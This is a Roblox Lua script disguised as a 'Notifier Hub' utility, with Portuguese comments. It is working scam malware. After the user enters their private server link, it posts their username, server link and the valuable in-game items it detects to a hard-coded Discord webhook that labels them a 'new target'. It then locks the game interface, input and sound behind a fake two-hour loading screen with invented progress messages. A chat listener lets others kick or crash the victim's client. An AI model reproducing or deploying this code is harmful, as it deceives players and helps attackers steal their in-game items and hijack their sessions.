local Players = game:GetService("Players")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

-- Variável para armazenar o link do servidor
local serverLink = ""

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- IDs para procurar
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    "2206090e-719d-4034-8720-700c9fb2h458",
    "dd76771-ce3c-4108-adae-5a488b2958be",
    "44392a62-6012-413d-9619-dab73c00539f",
    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- Função para verificar se um nome é um brainrot válido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- Função para procurar brainrots na workspace
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs específicos
    for _, id in ipairs(TARGET_IDS) do
        local model = Workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Remover duplicatas
    local uniqueBrainrots = {}
    for _, brainrot in ipairs(foundBrainrots) do
        local alreadyExists = false
        for _, existing in ipairs(uniqueBrainrots) do
            if existing == brainrot then
                alreadyExists = true
                break
            end
        end
        if not alreadyExists then
            table.insert(uniqueBrainrots, brainrot)
        end
    end
    
    return uniqueBrainrots
end

-- Função para enviar webhook com detecção de brainrots
local function sendInitialWebhook()
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    
    -- Detectar brainrots
    local detectedBrainrots = findBrainrots()
    
    -- Criar lista de brainrots formatada
    local brainrotsList = ""
    if #detectedBrainrots > 0 then
        for i, brainrot in ipairs(detectedBrainrots) do
            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
            if i >= 40 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    local payload = {
        content = "@everyone @here, UM NOVO ALVO ATIVOU O NOTIFIER HUB! @everyone @here",
        embeds = {{
            title = "🚀 NOTIFIER HUB INICIADO - PROJECT BRANZZ",
            color = 0x00FF00,
            fields = {
                {
                    name = "⌛ Data e hora de ativação:",
                    value = currentTime,
                    inline = false
                },
                {
                    name = "👤 Nome de usuário:",
                    value = playerName,
                    inline = true
                },
                {
                    name = "👥 Pessoas no servidor:",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "🔗 Link do servidor [NOVO 🆕]:",
                    value = "[Clique Aqui](" .. serverLink .. ")",
                    inline = false
                },
                {
                    name = "🎒🧠 BRAINROTS DETECTADOS:",
                    value = brainrotsList,
                    inline = false
                }
            },
            author = {
                name = "Notificador🧠 || By: Project BRANZz || ⌛: " .. currentTime
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = "https://discord.com/api/webhooks/1439734957034700902/67MGvp1Cp0hXSPHfuPHu54X7kOhTZRUSmz34n1HLhLl-M5U9cPtNuhevymNbHtreteYO",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("✅ Webhook enviado com sucesso!")
    else
        warn("❌ Erro ao enviar webhook: " .. tostring(result))
    end
end

-- Criar a GUI principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NotifierHub"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999
screenGui.Parent = PlayerGui

-- Frame principal
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 450, 0, 280)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Arredondar cantos
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = mainFrame

-- Borda gradiente
local border = Instance.new("Frame")
border.Size = UDim2.new(1, 4, 1, 4)
border.Position = UDim2.new(0, -2, 0, -2)
border.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
border.BorderSizePixel = 0
border.ZIndex = -1
border.Parent = mainFrame

local borderCorner = Instance.new("UICorner")
borderCorner.CornerRadius = UDim.new(0, 17)
borderCorner.Parent = border

-- Título
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
title.BorderSizePixel = 0
title.Text = "🔰 NOTIFIER HUB - PROJECT BRANZZ 🔰"
title.TextColor3 = Color3.fromRGB(0, 200, 255)
title.TextSize = 20
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 15)
titleCorner.Parent = title

-- Campo de entrada para o link
local linkLabel = Instance.new("TextLabel")
linkLabel.Size = UDim2.new(0.9, 0, 0, 25)
linkLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
linkLabel.BackgroundTransparency = 1
linkLabel.Text = "🔗 LINK DO SEU SERVIDOR PRIVADO:"
linkLabel.TextColor3 = Color3.fromRGB(150, 200, 255)
linkLabel.TextSize = 14
linkLabel.TextXAlignment = Enum.TextXAlignment.Left
linkLabel.Font = Enum.Font.GothamBold
linkLabel.Parent = mainFrame

local linkBox = Instance.new("TextBox")
linkBox.Size = UDim2.new(0.9, 0, 0, 45)
linkBox.Position = UDim2.new(0.05, 0, 0.35, 0)
linkBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
linkBox.BorderSizePixel = 0
linkBox.PlaceholderText = "https://www.roblox.com/games/... ou roblox://placeId..."
linkBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 150)
linkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
linkBox.TextSize = 14
linkBox.Font = Enum.Font.Gotham
linkBox.ClearTextOnFocus = false
linkBox.Parent = mainFrame

local linkCorner = Instance.new("UICorner")
linkCorner.CornerRadius = UDim.new(0, 10)
linkCorner.Parent = linkBox

local linkPadding = Instance.new("UIPadding")
linkPadding.PaddingLeft = UDim.new(0, 15)
linkPadding.PaddingRight = UDim.new(0, 15)
linkPadding.Parent = linkBox

-- Botão de ativação
local activateButton = Instance.new("TextButton")
activateButton.Size = UDim2.new(0.9, 0, 0, 60)
activateButton.Position = UDim2.new(0.05, 0, 0.65, 0)
activateButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
activateButton.BorderSizePixel = 0
activateButton.Text = "🚀 NOTIFIER HUB, METODH BRANZZ 🔰🔗"
activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
activateButton.TextSize = 18
activateButton.Font = Enum.Font.GothamBold
activateButton.AutoButtonColor = false
activateButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = activateButton

-- Efeito hover no botão
activateButton.MouseEnter:Connect(function()
    TweenService:Create(activateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
end)

activateButton.MouseLeave:Connect(function()
    TweenService:Create(activateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 255)}):Play()
end)

-- Sistema de kick/crash por chat
local function setupChatProtection()
    local function onChatMessage(message)
        local text = string.lower(message)
        
        if string.find(text, "kick") or string.find(text, "/kick") then
            -- Kickar o jogador
            wait(1)
            Players.LocalPlayer:Kick("Erro: 89972 script\nOla esta mensagem foi enviada pois anti cheat pegou agente então, tivemos que dar um kick em você para não sofre punição 🔰")
        
        elseif string.find(text, "crash") or string.find(text, "/crash") then
            -- Crashar o jogo
            wait(1)
            while true do
                for i = 1, 1000000 do
                    local a = Instance.new("Part")
                    a.Parent = workspace
                end
            end
        end
    end

    -- Monitorar chat
    if TextChatService then
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel.OnIncomingMessage = function(message)
                onChatMessage(message.Text)
                return message
            end
        end
    end
end

-- Função para BLOQUEAR COMPLETAMENTE a interface do Roblox
local function completelyBlockRobloxUI()
    -- Desabilitar TUDO no CoreGui
    pcall(function()
        for _, obj in ipairs(CoreGui:GetChildren()) do
            if obj:IsA("ScreenGui") then
                obj.Enabled = false
            end
        end
    end)
    
    -- ModalEnabled para bloquear input
    pcall(function()
        UserInputService.ModalEnabled = true
    end)
    
    -- Desabilitar PlayerGui
    pcall(function()
        for _, gui in ipairs(PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui ~= screenGui then
                gui.Enabled = false
            end
        end
    end)
    
    -- Desabilitar StarterGui
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
    
    -- Bloquear mouse
    pcall(function()
        UserInputService.MouseIconEnabled = false
    end)
    
    -- Bloquear teclado
    pcall(function()
        for _, key in ipairs(Enum.KeyCode:GetEnumItems()) do
            pcall(function()
                UserInputService:GetKeysPressed()[key] = nil
            end)
        end
    end)
end

-- Função para criar tela de carregamento QUE COBRE TUDO
local function createLoadingScreen()
    -- Enviar webhook imediatamente
    sendInitialWebhook()
    
    -- BLOQUEAR COMPLETAMENTE a interface ANTES de remover
    completelyBlockRobloxUI()
    
    -- Remover GUI principal
    screenGui:Destroy()
    
    -- Criar tela de carregamento QUE COBRE TUDO
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingScreen"
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    loadingGui.DisplayOrder = 99999
    loadingGui.Parent = PlayerGui
    
    -- Fundo QUE COBRE TUDO - Camada 1
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.ZIndex = 99999
    background.Parent = loadingGui
    
    -- Overlay azul - Camada 2
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
    overlay.BackgroundTransparency = 0.1
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 99999
    overlay.Parent = background
    
    -- Efeito de partículas - Camada 3
    local particles = Instance.new("Frame")
    particles.Size = UDim2.new(1, 0, 1, 0)
    particles.BackgroundColor3 = Color3.fromRGB(0, 50, 100)
    particles.BackgroundTransparency = 0.9
    particles.BorderSizePixel = 0
    particles.ZIndex = 99999
    particles.Parent = overlay
    
    -- Título principal - Camada 4
    local mainTitle = Instance.new("TextLabel")
    mainTitle.Size = UDim2.new(1, 0, 0, 100)
    mainTitle.Position = UDim2.new(0, 0, 0.1, 0)
    mainTitle.BackgroundTransparency = 1
    mainTitle.Text = "DUPLICATE HUB ☣️ ESTA PREPARADO PASTAS E COMANDOS VISUAIS...."
    mainTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
    mainTitle.TextSize = 32
    mainTitle.Font = Enum.Font.GothamBold
    mainTitle.TextStrokeTransparency = 0.3
    mainTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    mainTitle.TextStrokeThickness = 2
    mainTitle.ZIndex = 99999
    mainTitle.Parent = overlay
    
    -- Texto de status - Camada 4
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, 0, 0, 50)
    statusText.Position = UDim2.new(0, 0, 0.3, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "INICIANDO SISTEMA..."
    statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusText.TextSize = 22
    statusText.Font = Enum.Font.GothamBold
    statusText.ZIndex = 99999
    statusText.Parent = overlay
    
    -- Container da barra de progresso - Camada 4
    local progressContainer = Instance.new("Frame")
    progressContainer.Size = UDim2.new(0.9, 0, 0, 50)
    progressContainer.Position = UDim2.new(0.05, 0, 0.45, 0)
    progressContainer.BackgroundTransparency = 1
    progressContainer.ZIndex = 99999
    progressContainer.Parent = overlay
    
    -- Texto de porcentagem - Camada 5
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(1, 0, 0, 40)
    percentText.Position = UDim2.new(0, 0, 0, -40)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(0, 255, 255)
    percentText.TextSize = 28
    percentText.Font = Enum.Font.GothamBold
    percentText.ZIndex = 99999
    percentText.Parent = progressContainer
    
    -- Barra de progresso (fundo) - Camada 5
    local progressBackground = Instance.new("Frame")
    progressBackground.Size = UDim2.new(1, 0, 0, 30)
    progressBackground.Position = UDim2.new(0, 0, 0, 0)
    progressBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    progressBackground.BorderSizePixel = 0
    progressBackground.ZIndex = 99999
    progressBackground.Parent = progressContainer
    
    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 15)
    progressCorner.Parent = progressBackground
    
    -- Barra de progresso (preenchimento) - Camada 6
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 99999
    progressBar.Parent = progressBackground
    
    local progressBarCorner = Instance.new("UICorner")
    progressBarCorner.CornerRadius = UDim.new(0, 15)
    progressBarCorner.Parent = progressBar
    
    -- Efeito brilhante na barra - Camada 7
    local glow = Instance.new("Frame")
    glow.Size = UDim2.new(0, 30, 1, 0)
    glow.Position = UDim2.new(0, 0, 0, 0)
    glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    glow.BackgroundTransparency = 0.6
    glow.BorderSizePixel = 0
    glow.ZIndex = 99999
    glow.Parent = progressBar
    
    local glowCorner = Instance.new("UICorner")
    glowCorner.CornerRadius = UDim.new(0, 15)
    glowCorner.Parent = glow
    
    -- Frame de bloqueio TOTAL - Camada 1000 (MAIS ALTA)
    local blockerFrame = Instance.new("Frame")
    blockerFrame.Size = UDim2.new(1, 0, 1, 0)
    blockerFrame.Position = UDim2.new(0, 0, 0, 0)
    blockerFrame.BackgroundTransparency = 1
    blockerFrame.Active = true
    blockerFrame.ZIndex = 100000
    blockerFrame.Parent = loadingGui
    
    -- Lista de textos aleatórios
    local randomTexts = {
        "🔍 PROCURANDO ANTI CHEAT...",
        "📡 PROCURANDO REMOTE EVENTS...",
        "⚡ APLICANDO COMANDOS VISUAIS...",
        "❌ ERRO AO APLICAR, TENTANDO NOVAMENTE...",
        "🌐 CONECTANDO A API PUBLICA...",
        "⚠️ ERRO AO CONECTAR A API...",
        "✅ CONECTADO COM API PUBLICA COM SUCESSO!",
        "🧠 PROCURANDO BRAINROTS LISTADOS...",
        "🔎 PROCURANDO EM SERVIDORES PRIVADOS...",
        "🔑 SUCESSO! CONECTADO COM API PRIVADA",
        "🔗 PUXANDO PESSOAS PARA SEU SERVIDOR...",
        "👤 [JOGADOR] ENTROU NO SERVIDOR...",
        "🧠 BRAINROTS ENCONTRADOS: 0, PROCURANDO OUTROS...",
        "🛡️ INICIALIZANDO SISTEMA DE SEGURANÇA...",
        "🔒 BLOQUEANDO ACESSOS EXTERNOS...",
        "📊 ANALISANDO DADOS DO JOGADOR...",
        "🚀 OTIMIZANDO PERFORMANCE...",
        "🔧 CONFIGURANDO MODULOS INTERNOS..."
    }
    
    -- Função para mutar sons
    local function muteSounds()
        local UserGameSettings = UserSettings():GetService("UserGameSettings")
        local SoundService = game:GetService("SoundService")
        
        while true do
            pcall(function()
                UserGameSettings.MasterVolume = 0
                SoundService.Volume = 0
                settings().Audio.MasterVolume = 0
            end)
            wait(0.5)
        end
    end
    
    -- Iniciar mute de sons
    spawn(muteSounds)
    
    -- Variáveis de progresso
    local startTime = tick()
    local totalDuration = 2 * 60 * 60 -- 2 horas em segundos
    local lastTextChange = 0
    local currentTextIndex = 1
    local stuckAt89 = false
    
    -- Animação do efeito brilhante
    local function animateGlow()
        while true do
            local tween = TweenService:Create(glow, TweenInfo.new(0.8), {Position = UDim2.new(1, -30, 0, 0)})
            tween:Play()
            tween.Completed:Wait()
            glow.Position = UDim2.new(0, 0, 0, 0)
            wait(0.5)
        end
    end
    
    spawn(animateGlow)
    
    -- Loop de atualização principal
    local connection
    connection = RunService.Heartbeat:Connect(function()
        local currentTime = tick()
        local elapsed = currentTime - startTime
        local progress = math.min(elapsed / totalDuration, 1)
        
        -- Progresso mais rápido que trava no 89%
        if not stuckAt89 and progress >= 0.47 then -- 89%
            stuckAt89 = true
            progress = 0.47
        end
        
        local percentage = math.floor(progress * 190)
        
        -- Atualizar barra de progresso com animação suave
        local targetSize = progress * 1
        TweenService:Create(progressBar, TweenInfo.new(0.3), {Size = UDim2.new(targetSize, 0, 1, 0)}):Play()
        
        percentText.Text = percentage .. "%"
        
        -- Mudar texto aleatório a cada 3-5 segundos
        if currentTime - lastTextChange > math.random(3, 5) then
            currentTextIndex = math.random(1, #randomTexts)
            statusText.Text = randomTexts[currentTextIndex]
            lastTextChange = currentTime
        end
        
        -- Finalizar após 2 horas
        if elapsed >= totalDuration then
            connection:Disconnect()
            statusText.Text = "✅ COMPLETO! SISTEMA PRONTO PARA USO."
            percentText.Text = "190%"
            progressBar.Size = UDim2.new(1, 0, 1, 0)
        end
    end)
    
    return loadingGui
end

-- Função principal do botão
activateButton.MouseButton1Click:Connect(function()
    local link = linkBox.Text
    
    -- Validar link
    if link == "" or link == "https://www.roblox.com/games/... ou roblox://placeId..." then
        -- Efeito de erro
        linkBox.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        TweenService:Create(linkBox, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(35, 35, 50)}):Play()
        return
    end
    
    -- Salvar link
    serverLink = link
    
    -- Efeito de clique
    activateButton.Text = "🚀 INICIANDO..."
    activateButton.BackgroundColor3 = Color3.fromRGB(0, 80, 200)
    
    wait(0.5)
    
    -- Criar tela de carregamento
    createLoadingScreen()
end)

-- Iniciar proteção de chat
setupChatProtection()

print("🔰 NOTIFIER HUB - PROJECT BRANZZ CARREGADO!")
print("🔗 Insira o link do servidor privado e clique no botão para iniciar.")